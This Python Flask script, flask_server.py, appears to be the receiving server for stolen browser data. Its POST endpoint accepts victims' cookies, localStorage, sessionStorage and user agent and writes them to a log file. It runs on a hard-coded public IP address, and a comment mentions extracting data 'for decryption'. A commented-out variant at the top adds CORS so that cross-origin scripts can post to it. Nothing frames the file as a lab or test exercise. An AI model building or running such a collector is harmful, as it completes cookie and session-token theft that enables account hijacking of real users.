#!/usr/bin/env python3
# flask_server.py

# from flask import Flask, request, jsonify
# from flask_cors import CORS
#
#
# app = Flask(__name__)
# CORS(app)
#
#
# @app.route("/", methods=["POST", "OPTIONS"])
# def log_local_storage():
#     if request.method == "OPTIONS":
#         return "", 204
#     data = request.get_json()
#     print(data)
#     return jsonify(success=True)


from flask import Flask, request, jsonify

app = Flask(__name__)


@app.route('/', methods=['POST'])
def handle_post():
    data = request.json
    print('Received data:', data)

    # Process the data to extract any relevant information for decryption
    local_storage_data = data.get('localStorage', {})
    session_storage_data = data.get('sessionStorage', {})
    cookies = data.get('cookies', '')
    user_agent = data.get('userAgent', '')

    # Log the received information
    with open('received_data.log', 'a') as log_file:
        log_file.write(f'User Agent: {user_agent}\n')
        log_file.write(f'Local Storage: {local_storage_data}\n')
        log_file.write(f'Session Storage: {session_storage_data}\n')
        log_file.write(f'Cookies: {cookies}\n')
        log_file.write('---\n')

    return jsonify({'status': 'success'}), 200


if __name__ == "__main__":
    app.run("80.211.25.90", 8080)
